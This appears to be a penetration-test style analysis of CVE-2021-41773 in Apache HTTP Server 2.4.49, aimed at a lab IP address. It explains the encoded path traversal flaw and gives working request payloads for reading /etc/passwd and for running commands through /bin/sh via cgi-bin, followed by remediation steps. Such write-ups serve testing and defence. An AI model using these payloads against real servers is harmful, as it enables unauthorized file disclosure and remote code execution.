# Technical Analysis: CVE-2021-41773 - Apache HTTP Server 2.4.49

## Target Information
- **IP Address:** 192.168.1.50
- **Service:** Apache HTTP Server
- **Version:** 2.4.49
- **Port:** 80/TCP

## Vulnerability Overview
Apache HTTP Server version 2.4.49 introduced a flaw in the URI normalization process. An attacker can use path traversal sequences that include encoded characters (specifically `.%2e` for `..`) to bypass normalization and access files outside the document root.

### Path Traversal
The normalization logic failed to correctly interpret `.%2e` as a parent directory reference. If the server configuration allows access to directories beyond the document root (e.g., `<Directory />` is set to `Require all granted`), an attacker can read sensitive system files like `/etc/passwd`.

### Remote Code Execution (RCE)
The vulnerability can be escalated to RCE if the `mod_cgi` module is enabled. By traversing to a system shell (e.g., `/bin/sh`) through a directory that allows CGI execution (commonly `/cgi-bin/`), an attacker can execute arbitrary commands on the host system.

## Exploitation Strategy

### Phase 1: Verification (Path Traversal)
Attempt to read `/etc/passwd` using the encoded traversal sequence.
- **Payload:** `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`

### Phase 2: Exploitation (RCE)
If `mod_cgi` is active, attempt to execute a command by piping it into the traversal-reached shell.
- **Payload:** `POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`
- **Data:** `echo; id` (The `echo;` is required to provide a valid CGI response header).

## Remediation
- **Update:** Upgrade to Apache HTTP Server 2.4.51 or later.
- **Configuration:** Restrict access to the root directory in the Apache configuration:
  ```apache
  <Directory />
      AllowOverride none
      Require all denied
  </Directory>
  ```
